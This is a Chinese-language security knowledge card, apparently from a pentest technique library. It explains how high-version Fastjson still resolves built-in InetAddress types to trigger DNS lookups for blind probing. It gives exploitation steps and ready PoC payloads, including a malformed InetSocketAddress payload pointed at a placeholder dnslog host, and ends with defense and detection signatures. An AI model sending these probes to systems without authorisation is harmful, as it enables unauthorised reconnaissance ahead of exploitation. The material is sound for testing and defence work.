---
id: web-java-deser-fastjson-inetaddress-dns-probe-malformed
title: 高版本 Fastjson 内置 InetAddress 解析实现 DNS 探测：Inet4Address/Inet6Address 与畸形 InetSocketAddress
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-inetaddress-dns-probe
aliases:
- Fastjson DNS 探测
- Inet4Address DNSLog
- InetSocketAddress 畸形 payload
- 高版本 Fastjson 探测
- checkAutoType deserializers 绕过
- MiscCodec InetAddress
tags:
- fastjson
- java
- deserialization
- recon
- dnslog
- inetaddress
- inetsocketaddress
- malformed-json
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:44:57+08:00'
  notes: 已对照原文与11张图核对；checkAutoType内置deserializers返回、MiscCodec val->InetAddress.getByName、畸形InetSocketAddress {address:,"val":...}触发DNS均一致；fastjson 1.2.68为示例环境非受影响区间未设版本；未复现
---

## 一句话结论

高版本 Fastjson 即使关闭 AutoType，`checkAutoType` 仍会从内置 `deserializers`/mapping 返回 `java.net.Inet4Address`、`Inet6Address`、`InetSocketAddress`；这些类由 `MiscCodec` 处理，`val` 会传给 `InetAddress.getByName` 触发 DNS 查询，因此可以用 `{"@type":"java.net.Inet4Address","val":"<子域>.dnslog"}` 或畸形 `InetSocketAddress` payload 做无回显探测/外带。

## 原理

- `ParserConfig.checkAutoType` 在 AutoType 受限时仍有多条返回路径：
  ```java
  clazz = TypeUtils.getClassFromMapping(typeName);
  if (clazz == null) clazz = deserializers.findClass(typeName);
  if (clazz == null) clazz = typeMapping.get(typeName);
  if (internalWhite) clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
  if (clazz != null) { ... return clazz; }
  ```
  只有这些路径都失败，才会走到最后的 `if (!autoTypeSupport) throw JSONException`。
- `initDeserializers` 把 `java.net.Inet4Address`、`Inet6Address`、`InetSocketAddress` 注册为 `MiscCodec.instance`；`addBaseClassMappings`/内置 mapping 也包含相关类型。因此这些类在 AutoType 关闭时仍能被解析，属于“内置反序列化器”而非用户 `@type` 白名单。
- `MiscCodec.deserialze` 对 `InetAddress`/`Inet4Address`/`Inet6Address` 读取 `val` 字段，然后执行 `InetAddress.getByName(strVal)`，触发 DNS 解析。
- `InetSocketAddress` 的 `MiscCodec` 分支需要 `{` 后跟 `address`/`port` 等键，普通的 `{"@type":"...","val":"..."}` 会报 `syntax error, expect {, actual ,`。文章用畸形但 Fastjson 可解析的结构：
  ```text
  {"@type":"java.net.InetSocketAddress"{"address":,"val":"<子域>.dnslog"}}
  ```
  它利用解析器的状态机/容错：`@type` 字符串后直接遇到 `{`，进入 `InetSocketAddress` 的解析分支；`address` 的值为空，随后 `val` 被解析。DNS 实际发生在解析 `address` 的嵌套 `InetAddress` 时——`MiscCodec` 读取 `val` 并调用 `InetAddress.getByName`；最终 `new InetSocketAddress(address, port)` 的 address 可能为 null，但 DNS 已经触发。该 payload 不符合标准 JSON，但 Fastjson 的解析器接受它。
- 这类探测不执行代码，但能确认 Fastjson 解析器、AutoType 限制状态、目标是否出网/DNS 可达，是后续利用的前置。

## 触发条件

- 目标使用 Fastjson（文章以 1.2.68 为例），存在 `JSON.parse`/`parseObject` 入口。
- 未开启 `safeMode`（`safeMode` 会在 `checkAutoType` 开头直接抛异常，内置 deserializer 也不会到达）。
- 目标能进行 DNS 解析（可出网到攻击者 DNSLog，或能被内部 DNS 记录）。
- 攻击者能发送任意 JSON 字段，且可观察 DNSLog 命中。

## 利用步骤

1. 先发 `{"@type":"java.net.Inet4Address","val":"<随机子域>.dnslog.example"}`，观察 DNSLog 是否命中。
2. 若不命中，尝试 `java.net.Inet6Address` 同样结构。
3. 若 `InetSocketAddress` 需要，使用畸形 payload：
   ```text
   {"@type":"java.net.InetSocketAddress"{"address":,"val":"<随机子域>.dnslog.example"}}
   ```
   注意 `@type` 字符串后没有冒号，直接跟 `{`；`"address":` 后为空值，再逗号接 `"val"`。
4. 命中 DNS 说明目标为 Fastjson、可解析内置 InetAddress 类型且 DNS 可达；可进一步结合版本/依赖探测。
5. 记录命中时间、子域与请求，避免与正常 DNS 噪声混淆。

## PoC

Inet4Address：

```json
{"@type":"java.net.Inet4Address","val":"8b2a31a1.log.dnslog.example."}
```

Inet6Address：

```json
{"@type":"java.net.Inet6Address","val":"8b2a31a1.log.dnslog.example."}
```

InetSocketAddress（畸形但可解析）：

```json
{"@type":"java.net.InetSocketAddress"{"address":,"val":"51909e06.log.dnslog.example."}}
```

调用栈（Inet4Address）：

```text
InetAddress.getByName
 -> InetAddress.getAllByName0
 -> InetAddress.getAddressesFromNameService
 -> Inet6AddressImpl.lookupAllHostAddr
 -> Inet4Address.<init>
 <- MiscCodec.deserialze
 <- DefaultJSONParser.parseObject
 <- JSON.parse
```

## 变体与关联

- 变体：`Inet4Address`/`Inet6Address` 直接用 `val`；`InetSocketAddress` 需要 `{` + `address`/`port` 结构，按目标 Fastjson 版本调整。
- 变体：用不同随机子域区分多次探测；用 DNS TXT/CNAME 记录或内部 DNS 日志确认命中。
- 变体：其他内置 `MiscCodec` 类型（如 `URL`、`URI`、`File`、`Pattern`）行为不同，不能直接等同于 DNS 触发；本卡只讨论 InetAddress 系列。
- 关联：[[web-java-deser-fastjson-recon-version-dependency-probe]]（Fastjson 识别/版本/依赖探测总卡，已提到 InetSocketAddress DNS 粗判；本卡展开高版本内置 deserializer 绕过与畸形 payload 机制）。
- 关联：[[web-java-deser-fastjson-1247-class-cache-bypass]]、[[web-java-deser-fastjson-1280-exception-deserializer-cache-bypass]]（其他 `checkAutoType` 返回路径/缓存绕过）。
- 注意：`safeMode=true` 会阻断整条路径；`checkAutoType` 的 `deserializers` 分支只对特定内置类有效，不是任意类都能绕过 AutoType。

## 检测与防御

- 防御：开启 Fastjson `safeMode`，关闭 AutoType；对 `@type` 做严格白名单，拒绝 `java.net.Inet4Address`/`Inet6Address`/`InetSocketAddress` 等内置类型。
- 防御：限制应用出站 DNS/网络，使用内部 DNS 解析白名单；对异常域名查询做监控。
- 检测：请求体出现 `"@type":"java.net.Inet4Address"`、`Inet6Address`、`InetSocketAddress`、`MiscCodec` 相关类名；畸形 JSON 中 `@type` 后直接跟 `{`、`address` 空值等特征；DNS 日志出现随机长标签/异常子域。
- 检测：同一来源短时间内用大量随机子域触发 DNS；JSON 解析异常 `syntax error, expect {` 与 DNS 查询同时出现，可作为探测信号。
